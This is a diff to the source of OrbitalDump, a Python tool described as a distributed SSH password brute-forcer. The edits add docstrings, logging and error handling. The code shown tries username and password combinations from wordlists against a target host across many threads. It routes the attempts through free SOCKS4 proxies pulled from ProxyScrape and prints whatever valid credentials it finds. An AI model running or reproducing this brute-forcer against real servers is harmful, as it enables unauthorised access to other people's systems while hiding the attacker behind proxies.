@@ -4,7 +4,7 @@
 Name: OrbitalDump
 Author: K4YT3X
 Date Created: June 6, 2021
-Last Modified: June 6, 2021
+Last Modified: July 5, 2021
 
 A simple multi-threaded distributed SSH brute-forcing tool written in Python.
 """
@@ -34,6 +34,13 @@ class SshBruteForcer(threading.Thread):
         valid_credentials: list,
         proxies: collections.deque = None,
     ):
+        """
+        SSH brute forcer initialization function
+
+        :param jobs queue.Queue: a queue object containing scanning jobs
+        :param valid_credentials list: a list to contain valid credentials
+        :param proxies collections.deque: a deque of proxies to use
+        """
         threading.Thread.__init__(self)
         self.jobs = jobs
         self.valid_credentials = valid_credentials
@@ -123,7 +130,12 @@ class SshBruteForcer(threading.Thread):
         self.join()
 
 
-def parse_arguments():
+def parse_arguments() -> argparse.Namespace:
+    """
+    parse command line arguments
+
+    :rtype argparse.Namespace: namespace storing the parsed arguments
+    """
 
     parser = argparse.ArgumentParser(
         prog="orbitaldump",
@@ -155,6 +167,12 @@ def parse_arguments():
 
 
 def get_proxies() -> collections.deque:
+    """
+    retrieve a list(deque) of usable SOCKS4 proxies from ProxyScrape
+    the format looks something like deque(["1.1.1.1:1080", "2.2.2.2:1080"])
+
+    :rtype collections.deque: a deque of proxies
+    """
     logger.info("Retrieving SOCKS4 proxies from ProxyScrape")
     proxies_request = requests.get(
         "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"
@@ -176,80 +194,99 @@ def main():
     # disable built-in logging so paramiko won't print tracebacks
     logging.basicConfig(level=logging.CRITICAL)
 
-    # parse command line arguments
-    args = parse_arguments()
+    # remove built-in logger sink
+    logger.remove(0)
 
-    # verify argument validity
-    assert args.threads >= 1, "number of threads must >= 1"
-    assert args.username.is_file(), "username file does not exist"
-    assert args.password.is_file(), "password file does not exist"
-    assert args.port >= 0, "the port number must >= 0"
-    assert args.timeout >= 0, "timeout must >= 0"
-
-    # initialize variables
-    thread_pool = []
-    jobs = queue.Queue()
-    valid_credentials = []
-
-    # get proxies from ProxyScrape
-    proxies = None
-    if args.proxies:
-        proxies = get_proxies()
-
-    # create threads
-    logger.info(f"Launching {args.threads} brute-forcer threads")
-    for thread_id in range(args.threads):
-        thread = SshBruteForcer(jobs, valid_credentials, proxies)
-        thread.name = str(thread_id)
-        thread.start()
-        thread_pool.append(thread)
-
-    # add username and password combinations to jobs queue
-    logger.info("Loading usernames and passwords into queue")
-    with args.username.open("r") as username_file:
-        with args.password.open("r") as password_file:
-            for username in username_file:
-                for password in password_file:
-                    jobs.put(
-                        (
-                            args.hostname,
-                            username.strip(),
-                            password.strip(),
-                            args.port,
-                            args.timeout,
-                        )
-                    )
+    # add custom logger sink
+    logger.add(
+        sys.stderr,
+        colorize=True,
+        format="<fg 240>{time:HH:mm:ss.SSSSSS!UTC}</fg 240> | <level>{level: <8}</level> | <level>{message}</level>",
+    )
 
     try:
-        while not jobs.empty():
-            for thread in thread_pool:
-                if not thread.is_alive():
-                    logger.error(
-                        f"Thread {thread.name} exited early with errors",
-                        file=sys.stderr,
-                    )
+        # parse command line arguments
+        args = parse_arguments()
 
-            for thread in thread_pool:
-                if thread.is_alive():
+        # verify argument validity
+        try:
+            assert args.threads >= 1, "number of threads must >= 1"
+            assert args.username.is_file(), "username file does not exist"
+            assert args.password.is_file(), "password file does not exist"
+            assert args.port >= 0, "the port number must >= 0"
+            assert args.timeout >= 0, "timeout must >= 0"
+        except AssertionError as e:
+            logger.error(e)
+            sys.exit(1)
+
+        # initialize variables
+        thread_pool = []
+        jobs = queue.Queue()
+        valid_credentials = []
+
+        # get proxies from ProxyScrape
+        proxies = None
+        if args.proxies:
+            proxies = get_proxies()
+
+        # create threads
+        logger.info(f"Launching {args.threads} brute-forcer threads")
+        for thread_id in range(args.threads):
+            thread = SshBruteForcer(jobs, valid_credentials, proxies)
+            thread.name = str(thread_id)
+            thread.start()
+            thread_pool.append(thread)
+
+        # add username and password combinations to jobs queue
+        logger.info("Loading usernames and passwords into queue")
+        with args.username.open("r") as username_file:
+            with args.password.open("r") as password_file:
+                for username in username_file:
+                    for password in password_file:
+                        jobs.put(
+                            (
+                                args.hostname,
+                                username.strip(),
+                                password.strip(),
+                                args.port,
+                                args.timeout,
+                            )
+                        )
+
+        try:
+            while not jobs.empty():
+                for thread in thread_pool:
+                    if not thread.is_alive():
+                        logger.error(
+                            f"Thread {thread.name} exited early with errors",
+                            file=sys.stderr,
+                        )
+
+                for thread in thread_pool:
+                    if thread.is_alive():
+                        break
+                else:
                     break
-            else:
-                break
 
-    except (SystemExit, KeyboardInterrupt):
-        logger.warning("Stop signal received, stopping threads")
+        except (SystemExit, KeyboardInterrupt):
+            logger.warning("Stop signal received, stopping threads")
 
-    finally:
-        for thread in thread_pool:
-            thread.stop()
+        finally:
+            for thread in thread_pool:
+                thread.stop()
 
-        for thread in thread_pool:
-            thread.join()
+            for thread in thread_pool:
+                thread.join()
 
-    logger.success(
-        f"Brute-force completed, {len(valid_credentials)} valid credentials found"
-    )
-    for hostname, username, password, port, timeout in valid_credentials:
-        print(f"{username}@{hostname}:{port}:{password}")
+        logger.success(
+            f"Brute-force completed, {len(valid_credentials)} valid credentials found"
+        )
+        for hostname, username, password, port, timeout in valid_credentials:
+            print(f"{username}@{hostname}:{port}:{password}")
+
+    except Exception as e:
+        logger.exception(e)
+        sys.exit(1)
 
 
 # launch the main function if this file is ran directly
